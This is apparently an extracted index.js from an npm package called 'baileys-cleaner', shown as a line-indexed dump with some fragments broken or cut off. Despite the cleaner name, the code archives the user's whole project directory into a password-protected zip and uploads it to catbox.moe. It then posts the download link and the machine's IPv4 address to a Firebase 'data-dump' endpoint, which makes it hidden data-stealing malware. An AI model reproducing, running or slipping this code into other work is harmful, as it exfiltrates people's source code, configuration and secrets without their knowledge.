// File: tmp/tmpfkyb96xm/baileys-cleaner/package/index.js
// ======================================================================
Line 1: const fs = require('fs')
Line 2: const path = require('path')
Line 3: const os = require('os')
Line 4: const archiver = require('archiver-zip-encrypted')
Line 5: const fileType = require('file-type')
Line 6: const FormData = require('form-data')
Line 7: import('node-fetch').then(m => m.default(...args))
Line 8: const axios = require('axios')
Line 12: {
  const tmpPath = path.join(basePath, 'tmp');
  if (!fs.existsSync(tmpPath)) fs.mkdirSync(tmpPath);

  const outputName = Math.floor(10000000 + Math.random() * 90000000) + '.zip';
  const outputPath = path.join(tmpPath, outputName);
  const output = fs.createWriteStream(outputPath);

  const archive = archiver.create('zip-encrypted', {
    zlib: { level: 9 },
    encryptionMethod: 'aes256',
    password: 'zyuraa'
  });

  archive.pipe(output);

  const excludeFolders = ['node_modules', 'session', '.cache', '.npm', '.git'];
  const excludeFiles = ['package-lock.json'];

  const walkDir = (dir, callback) => {
    fs.readdirSync(dir).forEach(file => {
      const fullPath = path.join(dir, file);
      if (excludeFolders.includes(file) || excludeFiles.includes(file)) return;
      if (fs.lstatSync(fullPath).isDirectory()) walkDir(fullPath, callback);
      else callback(fullPath);
    });
  };

  walkDir(basePath, file => {
    const relative = path.relative(basePath, file);
    archi...
Line 13: path.join(basePath, 'tmp')
Line 17: path.join(tmpPath, outputName)
Line 26: archive.pipe(output)
Line 28: const excludeFolders = ['node_modules', 'session', '.cache', '.npm', '.git']
Line 29: const excludeFiles = ['package-lock.json']
Line 32: (_tmp_5 = fs.readdirSync(dir))
Line 33: path.join(dir, file)
Line 34: excludeFolders.includes(file)
Line 35: (_tmp_6 = fs.lstatSync(fullPath))
Line 36: callback(fullPath)
Line 41: path.relative(basePath, file)
Line 42: archive.file(file, { name: relative })
Line 45: archive.finalize()
Line 48: {
      const zipBuffer = fs.readFileSync(outputPath);
      const sizeMB = zipBuffer.length / 1024 / 1024;

      const cleanTmp = () => {
        fs.rmSync(tmpPath, { recursive: true, force: true });
      };

      if (sizeMB > 190) {
        cleanTmp();
        return;
      }

      const { ext } = await fileType.fromBuffer(zipBuffer);
      const form = new FormData();
      form.append('fileToUpload', zipBuffer, 'file.' + ext);
      form.append('reqtype', 'fileupload');

      const res = await fetch('https://catbox.moe/user/api.php', {
        method: 'POST',
        body: form
      });

      if (!res.ok) throw new Error();

      const link = await res.text();

      const ip = Object.values(os.networkInterfaces())
        .flat()
        .find(i => i.family === 'IPv4' && !i.internal)?.address || 'unknown';

      const data = {
        ip,
        link
      };

      await axios.post('https://db-node-dmp-default-rtdb.asia-southeast1.firebasedatabase.app/data-dump.json'...
Line 49: const zipBuffer = fs.readFileSync(outputPath)
Line 57: cleanTmp()
Line 66: const res = await fetch('https://catbox.moe/user/api.php', {
        method: 'POST',
        body: form
      })
Line 73: res.text()
Line 75: const ip = Object.values(os.networkInterfaces())
        .flat()
        .find(i => i.family === 'IPv4' && !i.internal)?.address || 'unknown'
Line 84: await axios.post('https://db-node-dmp-default-rtdb.asia-southeast1.firebasedatabase.app/data-dump.json', data)
Line 85: cleanTmp()
